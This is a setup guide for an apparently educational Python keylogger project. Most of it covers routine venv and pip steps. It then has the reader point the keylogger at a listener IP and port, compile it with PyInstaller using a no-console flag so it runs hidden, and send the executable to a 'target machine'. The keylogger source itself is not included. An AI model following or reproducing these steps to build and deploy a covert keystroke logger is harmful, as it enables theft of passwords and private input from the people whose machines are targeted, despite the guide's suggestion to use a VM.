# Python Virtual Environment Setup & Dependency Installation

This guide explains how to create a Python virtual environment (venv) and install the required dependencies for this project. **It is recommended to use this setup inside a virtual machine (VM)** for safety, as this project involves a keylogger.

## Prerequisites

* Python **3.8 or newer** installed
* `pip` available (usually bundled with Python)

### Installing pip (if not already installed)

#### On Linux / macOS

```bash
sudo apt update
sudo apt install python3-pip  # Debian/Ubuntu
```

```bash
brew install python  # macOS with Homebrew, pip comes bundled
```

#### On Windows

Download the [get-pip.py](https://bootstrap.pypa.io/get-pip.py) script and run:

```bash
python get-pip.py
```

Verify installation:

```bash
python --version
pip --version
```

---

## Step 1: Create a Virtual Environment (venv)

It is strongly recommended to use a virtual environment to isolate project dependencies.

### On Linux / macOS

```bash
python3 -m venv venv
```

### On Windows

```bash
python -m venv venv
```

This will create a folder named `venv` in your project directory.

---

## Step 2: Activate the Virtual Environment

### On Linux / macOS

```bash
source venv/bin/activate
```

### On Windows (Command Prompt)

```bat
venv\Scripts\activate
```

### On Windows (PowerShell)

```powershell
venv\Scripts\Activate.ps1
```

Once activated, your terminal prompt should change to indicate that the virtual environment is active.

---

## Step 3: Upgrade pip (Recommended)

```bash
pip install --upgrade pip
```

---

## Step 4: Install Required Python Packages

Install the external dependencies using `pip`:

```bash
pip install pynput cryptography
```

### Notes on Standard Libraries

The following module **does not need to be installed** because it is part of Python’s standard library:

* `socket`

You can import it directly in your code:

```python
import socket
```

---

## Step 5: Configure Network Settings

Before compiling, open `keylogger.py` and **change the IP address and port number** to match your server or listener configuration.

Example (adjust values as needed):

```python
SERVER_IP = "192.168.56.10"
SERVER_PORT = 4444
```

---

## Step 6: Compile Keylogger Script

For safe execution, the `keylogger.py` script should be compiled using PyInstaller:

```bash
pyinstaller --onefile --noconsole keylogger.py
```

After compilation, the executable will be located in the `dist` folder. Send this executable to the target machine or VM and run it there.

---

## Step 7: Verify Installation

You can verify that the packages are installed correctly by running:

```bash
pip list
```

Or by testing imports in Python:

```bash
python
```

```python
import pynput
from cryptography.fernet import Fernet
import socket
```

If no errors appear, the setup was successful.

---

## Deactivating the Virtual Environment

When you are done working on the project, deactivate the virtual environment with:

```bash
deactivate
```

---

## Summary

* Use a VM for safe testing
* `venv` isolates project dependencies
* Install `pip` if necessary
* `pynput` and `cryptography` must be installed via `pip`
* `socket` is a built-in Python library
* Compile `keylogger.py` with PyInstaller and run the executable on the target machine or VM
